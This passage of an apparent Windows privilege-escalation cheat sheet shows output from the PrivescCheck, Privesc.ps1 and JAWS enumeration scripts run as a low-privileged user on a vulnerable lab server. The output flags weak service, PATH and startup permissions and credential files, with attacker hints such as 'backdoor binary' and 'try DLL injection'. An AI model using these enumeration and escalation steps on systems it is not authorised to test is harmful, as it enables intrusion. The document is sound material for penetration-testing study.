++------+------------------------------------------------+------+
+| DESC | Interact with the Windows Update service and          |
+|      | determine when the system was last updated. Note that |
+|      | this check might be unreliable.                       |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | UPDATES > Installed Updates and Hotfixes       | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate the installed updates and hotfixes by       |
+|      | parsing the registry. If this fails, the check will   |
+|      | fall back to the built-in 'Get-HotFix' cmdlet.        |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | UPDATES > System up to date?                   | VULN |
++------+------------------------------------------------+------+
+| DESC | Enumerate the installed updates and hotfixes and      |
+|      | check whether a patch was applied in the last 31      |
+|      | days.                                                 |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | MISC > Endpoint Protection                     | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate installed security products (AV, EDR). This |
+|      | check is based on keyword matching (loaded DLLs,      |
+|      | running processes, installed applications and         |
+|      | registered services).                                 |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | MISC > OS Version                              | INFO |
++------+------------------------------------------------+------+
+| DESC | Print the detailed version number of the Operating    |
+|      | System. If we can't get the update history, this      |
+|      | might be useful.                                      |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name                            Version
+----                            -------
+Windows Server 2012 R2 Standard 6.3.9600.0
+
++------+------------------------------------------------+------+
+| TEST | MISC > Local Admin Group                       | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate the users and groups that belong to the     |
+|      | local 'Administrators' group.                         |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name          Type IsLocal IsEnabled
+----          ---- ------- ---------
+Administrator User    True      True
+
++------+------------------------------------------------+------+
+| TEST | MISC > User Home Folders                       | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate local HOME folders and check for            |
+|      | potentially weak permissions.                         |
++------+-------------------------------------------------------+
+[*] Found 4 result(s).
+
+HomeFolderPath          Read Write
+--------------          ---- -----
+C:\Users\Administrator False False
+C:\Users\backup         True  True
+C:\Users\Public         True  True
+C:\Users\user          False False
+
++------+------------------------------------------------+------+
+| TEST | MISC > Machine Role                            | INFO |
++------+------------------------------------------------+------+
+| DESC | Simply return the machine's role. It can be either    |
+|      | 'Workstation', 'Server' or 'Domain Controller'.       |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name     Role
+----     ----
+ServerNT Server
+
++------+------------------------------------------------+------+
+| TEST | MISC > System Startup History                  | INFO |
++------+------------------------------------------------+------+
+| DESC | Retrieve the machine's startup history. This might be |
+|      | useful to figure out how often a server is rebooted.  |
+|      | In the case of a workstation, such metric isn't as    |
+|      | relevant.                                             |
++------+-------------------------------------------------------+
+[*] Found 3 result(s).
+
+Index Time
+----- ----
+    1 2021-08-08 - 20:34:16
+    2 2021-08-08 - 20:30:26
+    3 2021-08-08 - 20:28:24
+
++------+------------------------------------------------+------+
+| TEST | MISC > Last System Startup                     | INFO |
++------+------------------------------------------------+------+
+| DESC | Determine the last system startup date and time based |
+|      | on the current tick count. Note that this might be    |
+|      | unreliable.                                           |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Time
+----
+2021-08-14 - 10:20:58
+
++------+------------------------------------------------+------+
+| TEST | MISC > Filesystem Drives                       | INFO |
++------+------------------------------------------------+------+
+| DESC | List partitions, removable storage and mapped network |
+|      | shares.                                               |
++------+-------------------------------------------------------+
+[*] Found 2 result(s).
+
+Root DisplayRoot Description
+---- ----------- -----------
+C:\
+D:\
+
++-----------------------------------------------------------------------------+
+|                         ~~~ PrivescCheck Report ~~~                         |
++----+------+-----------------------------------------------------------------+
+| NA | Info | APPS > ProgramData folders/files -> 8 result(s)                 |
+| NA | Info | APPS > Startup Apps -> 1 result(s)                              |
+| NA | Info | APPS > Non-default Apps -> 6 result(s)                          |
+| KO | Med. | APPS > Modifiable Apps -> 2 result(s)                           |
+| KO | Med. | APPS > Modifiable Startup Apps -> 1 result(s)                   |
+| NA | Info | APPS > Running Processes -> 12 result(s)                        |
+| KO | High | CONFIG > PATH Folder Permissions -> 4 result(s)                 |
+| OK | None | CONFIG > AlwaysInstallElevated                                  |
+| OK | None | CONFIG > WSUS Configuration                                     |
+| NA | None | CONFIG > SCCM Cache Folder                                      |
+| OK | None | CONFIG > SCCM Cache Folder                                      |
+| NA | None | CREDS > Credential Files                                        |
+| KO | Med. | CREDS > WinLogon -> 1 result(s)                                 |
+| KO | Med. | CREDS > Unattend Files -> 1 result(s)                           |
+| NA | None | CREDS > Credential Manager                                      |
+| NA | None | CREDS > PowerShell History                                      |
+| OK | None | CREDS > GPP Passwords                                           |
+| NA | None | CREDS > Credential Manager (web)                                |
+| OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
+| NA | None | HARDENING > LAPS Settings                                       |
+| NA | Info | HARDENING > LSA protections -> 4 result(s)                      |
+| NA | Info | HARDENING > UAC Settings -> 1 result(s)                         |
+| NA | None | HARDENING > PowerShell Transcription                            |
+| OK | None | HARDENING > BitLocker                                           |
+| NA | None | MISC > Endpoint Protection                                      |
+| NA | Info | MISC > Hijackable DLLs -> 1 result(s)                           |
+| NA | Info | MISC > Machine Role -> 1 result(s)                              |
+| NA | Info | MISC > System Startup History -> 3 result(s)                    |
+| NA | Info | MISC > Last System Startup -> 1 result(s)                       |
+| NA | Info | MISC > OS Version -> 1 result(s)                                |
+| NA | Info | MISC > Local Admin Group -> 1 result(s)                         |
+| NA | Info | MISC > User Home Folders -> 4 result(s)                         |
+| NA | Info | MISC > Filesystem Drives -> 2 result(s)                         |
+| NA | Info | NETWORK > TCP Endpoints -> 33 result(s)                         |
+| NA | Info | NETWORK > UDP Endpoints -> 16 result(s)                         |
+| NA | None | NETWORK > Saved Wifi Profiles                                   |
+| OK | None | SCHEDULED TASKS > Binary Permissions                            |
+| OK | None | SCHEDULED TASKS > Unquoted Path                                 |
+| KO | High | SERVICES > Service Permissions -> 1 result(s)                   |
+| KO | High | SERVICES > Registry Permissions -> 1 result(s)                  |
+| KO | High | SERVICES > Binary Permissions -> 5 result(s)                    |
+| OK | None | SERVICES > SCM Permissions                                      |
+| KO | High | SERVICES > Unquoted Path -> 1 result(s)                         |
+| NA | Info | SERVICES > Non-default Services -> 8 result(s)                  |
+| NA | None | UPDATES > Last Windows Update Date                              |
+| NA | None | UPDATES > Installed Updates and Hotfixes                        |
+| OK | None | UPDATES > System up to date?                                    |
+| NA | Info | USER > Non-default Groups -> 1 result(s)                        |
+| NA | Info | USER > Identity -> 1 result(s)                                  |
+| NA | None | USER > Environment Variables                                    |
+| OK | None | USER > Privileges                                               |
++----+------+-----------------------------------------------------------------+
+PS C:\Users\backup\Documents>
+
+
+======================================================================================================================
+3. Privesc script
+======================================================================================================================
+
+> Github link: https://github.com/enjoiz/Privesc
+
+Windows PowerShell script that finds misconfiguration issues which can lead to privilege escalation.
+
+
+Example - Output of the Privesc.ps1 script run on a vulnerable Windows server 2012 R2 with a low-privileged user
+======================================================================================================================
+
+PS C:\Users\backup\Documents> powershell -exec bypass
+Windows PowerShell
+Copyright (C) 2013 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\backup\Documents> . .\privesc.ps1
+
+PS C:\Users\backup\Documents> Invoke-Privesc
+
+Date of last applied patch - just use public exploits if not patched:
+No Instance(s) Available.
+
+----------------------------------------------------------------------
+Files that may contain Administrator password - you know what to do with this one:
+C:\Windows\Panther\Unattend.xml
+C:\Windows\panther\setupinfo
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\ProgramData\Application Data\McAfee\Common Framework\SiteList.xml
+
+----------------------------------------------------------------------
+Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading:
+Get-WmiObject : Invalid namespace "root\ccm\clientSDK"
+<SNIP>
+Not Installed.
+
+----------------------------------------------------------------------
+Checking AlwaysInstallElevated - install *.msi files as NT AUTHORITY\SYSTEM - exploit/windows/local/always_install_elevated:
+
+AlwaysInstallElevated : 1
+PSPath                : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+PSParentPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows
+PSChildName           : Installer
+PSDrive               : HKLM
+PSProvider            : Microsoft.PowerShell.Core\Registry
+
+
+----------------------------------------------------------------------
+Checking privileges - rotten potato:
+User privileges do not allow for rotten potato exploit.
+
+----------------------------------------------------------------------
+Checking if WSUS uses HTTP - eg. WSUXploit:
+WSUS misconfiguration not found.
+
+----------------------------------------------------------------------
+Services with space in path and not enclosed with quotes - if you have permissions run executable from different directory - exploit/windows/local/trusted_service_path:
+C:\Bitnami\JENKIN~1.1-0\APACHE~1\bin\tomcat8.exe //RS//jenkinsTomcat
+C:\Program Files\TH Application Service\Common Files\thservice.exe
+
+----------------------------------------------------------------------
+PATH variable entries permissions - place binary or DLL to execute before legitimate
+Group: Users, Permissions: AppendData on C:\Temp
+Group: Users, Permissions: AppendData on C:\Windows\System32\WindowsPowerShell\v1.0\
+Group: Users, Permissions: CreateFiles on C:\Temp
+Group: Users, Permissions: CreateFiles on C:\Windows\System32\WindowsPowerShell\v1.0\
+
+----------------------------------------------------------------------
+System32 directory permissions - backdoor windows binaries:
+Permissions set on System32 directory are correct for all groups.
+
+----------------------------------------------------------------------
+System32 files and directories permissions - backdoor windows binaries:
+Group: Users, Permissions: CreateFiles, ReadAndExecute, Synchronize on C:\Windows\system32\spool\drivers\color
+
+----------------------------------------------------------------------
+Windows Temp directory read permissions - DLL Sideloading each created directory:
+Get-Acl : Attempted to perform an unauthorized operation.
+<SNIP>
+Permissions set on Windows Temp directory are correct for all groups.
+
+----------------------------------------------------------------------
+Program Files directory permissions - backdoor windows binaries:
+Permissions set on Program Files directory are correct for all groups.
+
+----------------------------------------------------------------------
+Program Files files and directories permissions - backdoor windows binaries:
+Group: Users, Permissions: FullControl on C:\Program Files\TH Application Service
+
+----------------------------------------------------------------------
+All users startup permissions - execute binary with permissions of logged user:
+Group: Users, Permissions: FullControl on C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+
+----------------------------------------------------------------------
+Startup executables permissions - backdoor startup binaries and check if they are also run at startup by other users:
+Get-ItemProperty : Cannot find path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' because it does not
+exist.
+At C:\Users\backup\Documents\privesc.ps1:352 char:20
++         $result += Get-ItemProperty -Path hkcu:\Software\Microsoft\Windows\Curre ...
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Version\RunOnce:String) [Get-ItemProperty], ItemNotFo
+   undException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemPropertyCommand
+
+Permissions set on startup executables are correct for all groups.
+
+----------------------------------------------------------------------
+Startup executables directory permissions - try DLL injection:
+Get-ItemProperty : Cannot find path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' because it does not exist.
+At C:\Users\backup\Documents\privesc.ps1:366 char:20
++         $result += Get-ItemProperty -Path hkcu:\Software\Microsoft\Windows\Curre ...
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Version\RunOnce:String) [Get-ItemProperty], ItemNotFo
+   undException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemPropertyCommand
+
+Permissions set on startup executables directories are correct for all groups.
+
+----------------------------------------------------------------------
+Checking permissions on uninstall registy keys and subkeys (changing binary paths):
+Permissions set on uninstall registry keys and subkeys are correct for all groups.
+
+----------------------------------------------------------------------
+Checking services permissions - change BINARY_PATH_NAME of a service:
+Permissions set on services are correct for all groups. Double check - each part of SDDL should have A as Allow at the beginning.
+
+----------------------------------------------------------------------
+Checking permissions on services registy keys and subkeys (changing ImagePath value of a service):
+Permissions set on services registry keys and subkeys are correct for all groups.
+
+----------------------------------------------------------------------
+Service binary permissions - backdoor service binary:
+Permissions set on service binaries are correct for all groups.
+
+----------------------------------------------------------------------
+Service directory permissions - try DLL injection:
+Group: Users, Permissions: AppendData on C:\Bitnami\JENKIN~1.1-0\APACHE~1\bin
+Group: Users, Permissions: AppendData on C:\Bitnami\JENKIN~1.1-0\apache2\bin
+Group: Users, Permissions: AppendData on C:\Bitnami\JENKIN~1.1-0\gradle\scripts
+Group: Users, Permissions: CreateFiles on C:\Bitnami\JENKIN~1.1-0\APACHE~1\bin
+Group: Users, Permissions: CreateFiles on C:\Bitnami\JENKIN~1.1-0\apache2\bin
+Group: Users, Permissions: CreateFiles on C:\Bitnami\JENKIN~1.1-0\gradle\scripts
+
+----------------------------------------------------------------------
+Process binary permissions - backdoor process binary:
+Permissions set on process binaries are correct for all groups.
+
+----------------------------------------------------------------------
+Process directory permissions - try DLL injection:
+Permissions set on process directories are correct for all groups.
+
+----------------------------------------------------------------------
+Scheduled process binary permissions - backdoor binary:
+Permissions set on scheduled binaries are correct for all groups.
+
+----------------------------------------------------------------------
+Scheduled process directory permissions - try DLL injection:
+Group: Users, Permissions: AppendData on \
+Group: Users, Permissions: CreateFiles on \
+
+----------------------------------------------------------------------
+Loaded DLLs permissions - backdoor DLL:
+Permissions set on loaded DLLs are correct for all groups.
+
+----------------------------------------------------------------------
+PS C:\Users\backup\Documents>
+
+
+======================================================================================================================
+4. JAWS script
+======================================================================================================================
+
+JAWS - Just Another Windows (Enum) Script
+
+Github link: https://github.com/411Hall/JAWS
+
+"JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. 
+It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7."
+
+
+Example - Output of the JAWS script run on a vulnerable Windows server 2012 R2 with a low-privileged user
+======================================================================================================================
+
+PS > .\jaws-enum.ps1 
+
+############################################################
+##     J.A.W.S. (Just Another Windows Enum Script)        ##
+##                                                        ##
+##           https://github.com/411Hall/JAWS              ##
+##                                                        ##
+############################################################
+
+Windows Version: Microsoft Windows Server 2012 R2 Standard
+Architecture: AMD64
+Hostname: WIN-EVAGJ1T16QD
+Current User: backup
+Current Time\Date: 08/14/2021 12:27:37
+
+-----------------------------------------------------------
+ Users
+-----------------------------------------------------------
+----------
+Username: Administrator
+Groups:   Administrators Remote Desktop Users
+----------
+Username: backup
+Groups:   Backup Operators Remote Desktop Users Users
+----------
+Username: Guest
+Groups:   Guests
+----------
+Username: user
+Groups:   Remote Desktop Users Users
+
+-----------------------------------------------------------
+ Network Information
+-----------------------------------------------------------
+Windows IP Configuration
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : 2a01:e34:ec6f:d7e0:55d7:c826:4294:b8ed
+   Link-local IPv6 Address . . . . . : fe80::55d7:c826:4294:b8ed%12
+   IPv4 Address. . . . . . . . . . . : 192.168.1.50
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::6aa3:78ff:fe8b:cdd%12
+                                       192.168.1.254
+
+Tunnel adapter isatap.{90148F03-D3ED-497A-A8AA-707E40A59758}:
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+-----------------------------------------------------------
+ Arp
+-----------------------------------------------------------
+Interface: 192.168.1.50 --- 0xc
+  Internet Address      Physical Address      Type
+  192.168.1.35          5c-87-9c-d9-8b-1d     dynamic
+  192.168.1.254         68-a3-78-8b-0c-dd     dynamic
+  192.168.1.255         ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.77.124.213        01-00-5e-4d-7c-d5     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+
+-----------------------------------------------------------
+ NetStat
+-----------------------------------------------------------
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       532
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       532
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1828
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8009           0.0.0.0:0              LISTENING       292
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       352
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       720
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       436
+  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       444
+  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1856
+  TCP    0.0.0.0:49159          0.0.0.0:0              LISTENING       1104
+  TCP    0.0.0.0:49160          0.0.0.0:0              LISTENING       452
+  TCP    127.0.0.1:8005         0.0.0.0:0              LISTENING       292
+  TCP    127.0.0.1:49161        127.0.0.1:49162        ESTABLISHED     292
+  TCP    127.0.0.1:49162        127.0.0.1:49161        ESTABLISHED     292
+  TCP    127.0.0.1:49163        127.0.0.1:49164        ESTABLISHED     292
+  TCP    127.0.0.1:49164        127.0.0.1:49163        ESTABLISHED     292
+  TCP    127.0.0.1:49165        127.0.0.1:49166        ESTABLISHED     292
+  TCP    127.0.0.1:49166        127.0.0.1:49165        ESTABLISHED     292
+  TCP    127.0.0.1:49167        127.0.0.1:49168        ESTABLISHED     292
+  TCP    127.0.0.1:49168        127.0.0.1:49167        ESTABLISHED     292
+  TCP    127.0.0.1:49169        127.0.0.1:49170        ESTABLISHED     292
+  TCP    127.0.0.1:49170        127.0.0.1:49169        ESTABLISHED     292
+  TCP    127.0.0.1:49171        127.0.0.1:49172        ESTABLISHED     292
+  TCP    127.0.0.1:49172        127.0.0.1:49171        ESTABLISHED     292
+  TCP    127.0.0.1:49173        127.0.0.1:49174        ESTABLISHED     292
+  TCP    127.0.0.1:49174        127.0.0.1:49173        ESTABLISHED     292
+  TCP    127.0.0.1:49175        127.0.0.1:49176        ESTABLISHED     292
+  TCP    127.0.0.1:49176        127.0.0.1:49175        ESTABLISHED     292
+  TCP    192.168.1.50:135       192.168.1.35:8332      ESTABLISHED     536
+  TCP    192.168.1.50:139       0.0.0.0:0              LISTENING       4
+  TCP    192.168.1.50:445       192.168.1.35:11125     ESTABLISHED     4
+  TCP    192.168.1.50:49154     192.168.1.35:11127     ESTABLISHED     720
+  TCP    192.168.1.50:49405     140.82.121.4:443       TIME_WAIT       0
+  TCP    [::]:80                [::]:0                 LISTENING       532
+  TCP    [::]:135               [::]:0                 LISTENING       536
+  TCP    [::]:443               [::]:0                 LISTENING       532
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3389              [::]:0                 LISTENING       1828
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       352
+  TCP    [::]:49153             [::]:0                 LISTENING       676
+  TCP    [::]:49154             [::]:0                 LISTENING       720
+  TCP    [::]:49155             [::]:0                 LISTENING       436
+  TCP    [::]:49157             [::]:0                 LISTENING       444
+  TCP    [::]:49158             [::]:0                 LISTENING       1856
+  TCP    [::]:49159             [::]:0                 LISTENING       1104
+  TCP    [::]:49160             [::]:0                 LISTENING       452
+  UDP    0.0.0.0:500            *:*                                    720
+  UDP    0.0.0.0:3389           *:*                                    1828
+  UDP    0.0.0.0:4500           *:*                                    720
+  UDP    0.0.0.0:5353           *:*                                    292
+  UDP    0.0.0.0:5355           *:*                                    864
+  UDP    0.0.0.0:33848          *:*                                    292
+  UDP    0.0.0.0:54959          *:*                                    1104
+  UDP    192.168.1.50:137       *:*                                    4
+  UDP    192.168.1.50:138       *:*                                    4
+  UDP    [::]:500               *:*                                    720
+  UDP    [::]:3389              *:*                                    1828
+  UDP    [::]:4500              *:*                                    720
+  UDP    [::]:5353              *:*                                    292
+  UDP    [::]:5355              *:*                                    864
+  UDP    [::]:33848             *:*                                    292
+  UDP    [::]:54959             *:*                                    1104
+
+
+-----------------------------------------------------------
+ Firewall Status
+-----------------------------------------------------------
+Firewall is Disabled
+
+-----------------------------------------------------------
+ FireWall Rules
+-----------------------------------------------------------
+Name                                    LocalPorts                              ApplicationName
+----                                    ----------                              ---------------
+Core Networking - Packet Too Big (IC...
+File and Printer Sharing (Echo Reque...
+File and Printer Sharing (Echo Reque...
+File and Printer Sharing (Spooler Se... RPC-EPMap
+Bitnami Jenkins Stack Manager Tool      *                                       C:\Bitnami\jenkins-2.121.1-0\manager...
+Bitnami Jenkins Stack Manager Tool      *                                       C:\Bitnami\jenkins-2.121.1-0\manager...
+Remote Desktop - Shadow (TCP-In)        *                                       C:\Windows\system32\RdpSa.exe
+Remote Desktop - Shadow (TCP-In)        *                                       C:\Windows\system32\RdpSa.exe
+File and Printer Sharing (Spooler Se... RPC                                     C:\Windows\system32\spoolsv.exe
+Core Networking - Dynamic Host Confi... 68                                      C:\Windows\system32\svchost.exe
+Core Networking - Dynamic Host Confi... 546                                     C:\Windows\system32\svchost.exe
+Core Networking - Teredo (UDP-In)       Teredo                                  C:\Windows\system32\svchost.exe
+File and Printer Sharing (LLMNR-UDP-In) 5355                                    C:\Windows\system32\svchost.exe
+Remote Desktop - User Mode (TCP-In)     3389                                    C:\Windows\system32\svchost.exe
+Remote Desktop - User Mode (TCP-In)     3389                                    C:\Windows\system32\svchost.exe
+Remote Desktop - User Mode (UDP-In)     3389                                    C:\Windows\system32\svchost.exe
+Remote Desktop - User Mode (UDP-In)     3389                                    C:\Windows\system32\svchost.exe
+Core Networking - Destination Unreac...                                         System
+Core Networking - Destination Unreac...                                         System
+Core Networking - Internet Group Man...                                         System
+Core Networking - IPHTTPS (TCP-In)      IPHTTPS                                 System
+Core Networking - IPv6 (IPv6-In)                                                System
+Core Networking - Multicast Listener...                                         System
+Core Networking - Multicast Listener...                                         System
+Core Networking - Multicast Listener...                                         System
+Core Networking - Multicast Listener...                                         System
+Core Networking - Neighbor Discovery...                                         System
+Core Networking - Neighbor Discovery...                                         System
+Core Networking - Parameter Problem ...                                         System
+Core Networking - Router Advertiseme...                                         System
+Core Networking - Router Solicitatio...                                         System
+Core Networking - Time Exceeded (ICM...                                         System
+File and Printer Sharing (NB-Datagra... 138                                     System
+File and Printer Sharing (NB-Name-In)   137                                     System
+File and Printer Sharing (NB-Session... 139                                     System
+File and Printer Sharing (SMB-In)       445                                     System
+File and Printer Sharing over SMBDir... 5445                                    System
+Windows Remote Management (HTTP-In)     5985                                    System
+Windows Remote Management (HTTP-In)     5985                                    System
+Core Networking - Multicast Listener...
+Core Networking - Multicast Listener...
+Core Networking - Multicast Listener...
+Core Networking - Multicast Listener...
+Core Networking - Neighbor Discovery...
+Core Networking - Neighbor Discovery...
+Core Networking - Packet Too Big (IC...
+Core Networking - Parameter Problem ...
+Core Networking - Router Advertiseme...
+Core Networking - Router Solicitatio...
+Core Networking - Time Exceeded (ICM...
+File and Printer Sharing (Echo Reque...
+File and Printer Sharing (Echo Reque...
+Core Networking - Group Policy (LSAS... *                                       C:\Windows\system32\lsass.exe
+Core Networking - DNS (UDP-Out)         *                                       C:\Windows\system32\svchost.exe
+Core Networking - Dynamic Host Confi... 68                                      C:\Windows\system32\svchost.exe
+Core Networking - Dynamic Host Confi... 546                                     C:\Windows\system32\svchost.exe
+Core Networking - Group Policy (TCP-... *                                       C:\Windows\system32\svchost.exe
+Core Networking - IPHTTPS (TCP-Out)     *                                       C:\Windows\system32\svchost.exe
+Core Networking - Teredo (UDP-Out)      *                                       C:\Windows\system32\svchost.exe
+File and Printer Sharing (LLMNR-UDP-... *                                       C:\Windows\system32\svchost.exe
+Core Networking - Group Policy (NP-Out) *                                       System
+Core Networking - Internet Group Man...                                         System
+Core Networking - IPv6 (IPv6-Out)                                               System
+File and Printer Sharing (NB-Datagra... *                                       System
+File and Printer Sharing (NB-Name-Out)  *                                       System
+File and Printer Sharing (NB-Session... *                                       System
+File and Printer Sharing (SMB-Out)      *                                       System
+
+
+-----------------------------------------------------------
+ Hosts File Content
+-----------------------------------------------------------
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#       127.0.0.1       localhost
+#       ::1             localhost
+
+-----------------------------------------------------------
+ Processes
+-----------------------------------------------------------
+Name                 ProcessID Owner  CommandLine
+----                 --------- -----  -----------
+cmd.exe                   1028
+cmd.exe                   3176 backup cmd
+cmd.exe                   3500 backup "C:\Windows\system32\cmd.exe"
+cmd.exe                   3360 backup cmd
+conhost.exe               1044
+conhost.exe               2896 backup \??\C:\Windows\system32\conhost.exe 0x4
+conhost.exe               1036
+csrss.exe                  480
+csrss.exe                  276
+dllhost.exe               2388 backup C:\Windows\system32\DllHost.exe /Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}
+dwm.exe                   2428
+explorer.exe              3444 backup C:\Windows\Explorer.EXE
+httpd.exe                 1140
+httpd.exe                  532
+iexplore.exe               368 backup "C:\Program Files\Internet Explorer\iexplore.exe"
+iexplore.exe               972 backup "C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:368 CREDAT:267777
+                                      /prefetch:2
+java.exe                  1104
+lsass.exe                  452
+msdtc.exe                 2784
+notepad.exe                656 backup "C:\Windows\system32\NOTEPAD.EXE" C:\Users\backup\Documents\Test.txt
+powershell.exe            3280 backup powershell  -exec bypass
+powershell.exe            2744 backup "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+RuntimeBroker.exe         4048 backup C:\Windows\System32\RuntimeBroker.exe -Embedding
+services.exe               444
+smss.exe                   196
+spoolsv.exe                436
+svchost.exe                784
+svchost.exe                720
+svchost.exe                676
+svchost.exe                508
+svchost.exe                536
+svchost.exe                864
+svchost.exe               1088
+svchost.exe               1856
+svchost.exe               1828
+svchost.exe                992
+System                       4
+System Idle Process          0
+taskhostex.exe            2052 backup taskhostex.exe
+TiWorker.exe              2368
+tomcat8.exe                292
+TrustedInstaller.exe      2424
+wininit.exe                352
+winlogon.exe              3516
+winserv.exe                964
+WmiPrvSE.exe               632
+
+-----------------------------------------------------------
+ Scheduled Tasks
+-----------------------------------------------------------
+Current System Time: 08/14/2021 12:27:40
+
+TaskName    : \Optimize Start Menu Cache Files-S-1-5-21-3698357007-189532211-3203426890-1008
+Run As User : backup
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
+Run As User : Everyone
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
+Run As User : Everyone
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Manual)
+Run As User : Everyone
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\AppID\SmartScreenSpecific
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Application Experience\ProgramDataUpdater
+Run As User : SYSTEM
+Task To Run : %windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate
+
+TaskName    : \Microsoft\Windows\Autochk\Proxy
+Run As User : SYSTEM
+Task To Run : %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Chkdsk\ProactiveScan
+Run As User : SYSTEM
